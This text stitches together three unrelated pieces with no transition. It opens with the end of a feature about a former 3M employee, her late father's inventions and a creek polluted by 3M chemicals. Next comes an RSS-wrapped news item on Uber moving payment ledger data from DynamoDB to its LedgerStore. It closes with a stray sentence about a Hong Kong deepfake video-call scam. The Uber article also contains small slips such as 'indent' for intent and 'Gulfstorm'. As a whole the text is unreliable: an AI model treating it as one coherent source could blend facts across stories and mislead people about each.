<p data-pp-blocktype="copy" data-pp-id="105.0">Hansen often wonders what her father would say about 3M if he were still alive. A few years ago, he began to show signs of dementia, which worsened during the COVID-19 pandemic. Every time Hansen explained to him that a novel coronavirus was sickening people around the world, he asked how he might contribute — forgetting that the N95 mask he helped to create was already protecting millions of people from infection. When he died, in January 2021, Hansen noticed some Coban wrap on his arm. It was shielding his delicate skin from tears, just as he had designed it to. “He invented that,” Hansen told the hospice nurse, who smiled politely.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="106.0">After she left 3M, Hansen began volunteering at a local nature preserve, where she works to clear paths and protect native plants. Last August, she took me there, and we walked to a creek where she often spends time. The water is home to three species of trout, she told me. It is also polluted by forever chemicals that 3M once dumped upstream.</p>
        
    
                                  
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="108.0">For most of our hike, a thick wall of flowers — purple joe-pye weed and goldenrod — made it impossible to see the creek bank. Then we came to a wooden bench. I climbed on top of it and looked down on the creek. As I listened to the gurgling of water and the buzzing of insects, I thought I understood why Hansen liked to come here. It was too late to save the creek from pollution; 3M’s chemicals could be there for thousands of years to come. Hansen just wanted to appreciate what was left and to leave the place a little better than she’d found it.</p>

            <description><![CDATA[<p>URL: <a href="https://www.infoq.com/news/2024/05/uber-dynamodb-ledgerstore/">https://www.infoq.com/news/2024/05/uber-dynamodb-ledgerstore/</a>, See on <a href="https://news.ycombinator.com/item?id=40413891">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
								<p>Uber <a href="https://www.uber.com/en-AU/blog/migrating-from-dynamodb-to-ledgerstore/">migrated all its payment transaction data from DynamoDB and blob storage into a new long-term solution</a>, a purpose-built data store named LedgerStore. The company was looking for cost savings and had previously reduced the use of DynamoDB to store hot data (12 weeks old). The move resulted in significant savings and simplified the storage architecture.</p>

<p>Uber built Gulfstream, its payment platform, in 2017 and used DynamoDB for storage. Due to rising storage costs, DynamoDB was used only for the most recent data (12 weeks), and older data was stored in TerraBlob, an S3-like service created in-house by Uber.</p>

<p>In the meantime, the company started working on a dedicated solution for storing financial transactions with data integrity guarantees. <a href="https://www.linkedin.com/in/kaushikd49">Kaushik Devarajaiah</a>, tech lead at Uber, explains the unique challenges of creating a bespoke data store:</p>

<blockquote>
<p>LedgerStore is an immutable storage solution at Uber that provides verifiable data completeness and correctness guarantees to ensure data integrity for these transactions. [...] Considering that ledgers are the source of truth of any financial event or data movement at Uber, it is important to be able to look up ledgers from various access patterns via indexes. This brings in the need for trillions of indexes to index hundreds of billions of ledgers.</p>
</blockquote>

<p><a href="https://www.uber.com/en-AU/blog/how-ledgerstore-supports-trillions-of-indexes/">LedgerStore</a> supports strongly and eventually consistent indexes. For strongly consistent indexes, the data store uses a two-phase commit. It first persists the indent on the index and subsequently persists the record. Lastly, if the record write succeeds, the intent is asynchronously committed or rolled back in case of failure. If the intent write fails, the whole insert operation fails, as consistency guarantees cannot be supported. During reads, any writes with uncommitted intents are either committed (if the record read succeeds) or deleted (if the record read fails) asynchronously. LedgerStore implements eventually consistent indexes by leveraging materialized views from its home-grown <a href="https://www.uber.com/blog/schemaless-sql-database/?uclick_id=37e0581b-5432-40df-b0a8-4b055bb80aa7">Docstore database</a>, a distributed database built on top of MySQL.</p>

<p><img alt="" data-src="news/2024/05/uber-dynamodb-ledgerstore/en/resources/1uber-ledgerstore-writes-1716025995484.jpeg" src="https://imgopt.infoq.com/fit-in/3000x4000/filters:quality(85)/filters:no_upscale()/news/2024/05/uber-dynamodb-ledgerstore/en/resources/1uber-ledgerstore-writes-1716025995484.jpeg" rel="share"></p>

<p>Two-phase Commit Write For Strongly Consistent Indexes (Source: <a href="https://www.uber.com/en-AU/blog/how-ledgerstore-supports-trillions-of-indexes/">Uber Engineering Blog</a>)</p>

<p>To offload older ledger data to cold storage, LedgerStore uses time-range indexes to support temporal queries. Uber moved from using <a href="https://aws.amazon.com/dynamodb/">DynamoDB</a> and Docstore for storing time-range indexes. The original solution utilized two tables in DynamoDB, one optimized for writes and the second for reads. This design was dictated by DynamoDB’s capacity management and avoided hot partitions and throttling. The new design uses the Docstore database with a single table, and leverages prefix scanning for efficient reads.</p>

<p>LedgerStore supports index lifecycle management, automating data reindexing in case the index definition changes. The process creates a new index, backfills the data from the old index, performs relevant validations, swaps indexes, and deletes the old one.</p>

<p><img alt="" data-src="news/2024/05/uber-dynamodb-ledgerstore/en/resources/1uber-ledgerstore-index-backfill-1716025995484.jpeg" src="https://imgopt.infoq.com/fit-in/3000x4000/filters:quality(85)/filters:no_upscale()/news/2024/05/uber-dynamodb-ledgerstore/en/resources/1uber-ledgerstore-index-backfill-1716025995484.jpeg" rel="share"></p>

<p>Index Backfilling From Cold Storage (Source: <a href="https://www.uber.com/en-AU/blog/how-ledgerstore-supports-trillions-of-indexes/">Uber Engineering Blog</a>)</p>

<p>The company faced unique challenges while migrating petabytes of financial transaction data into LedgerStore. It used shadow and offline validation to ensure the correctness of the migration and the performance and scalability of LedgerStore in the production environment. For shadow validation, Gulfstorm was double-writing the data to DynamoDB and LedgerStore and comparing the data returned by reads between the two data stores.</p>

<p>Additionally, Uber implemented offline validation for historical data, coupled with the incremental backfill job running in <a href="https://spark.apache.org/">Apache Spark</a>. The backfill process alone posed significant problems, as the load generated by the process amounted to ten times the usual production load, and the overall process took three months. Engineers used several measures to control the process and mitigate any issues, including dynamic rate control to adjust the processing rate based on the production traffic handled by the platform and emergency stop to halt the process quickly in case of major issues.</p>

<p>Lastly, the team took a conservative approach towards the rollout and adopted a fallback to fetching the data from DynamoDB in case it wasn’t found in LedgerStore. The overall migration was completed successfully, and the company didn’t experience any downtime or outages during and after the migration. The move to LedgerStore resulted in significant cost savings, with estimated yearly savings of over $6 million.</p>

            Hong Kong police said in February that during the elaborate scam the employee, a finance worker, was duped into attending a video call with people he believed were the chief financial officer and other members of staff, but all of whom turned out to be deepfake re-creations. The authorities did not name the company or parties involved at the time.
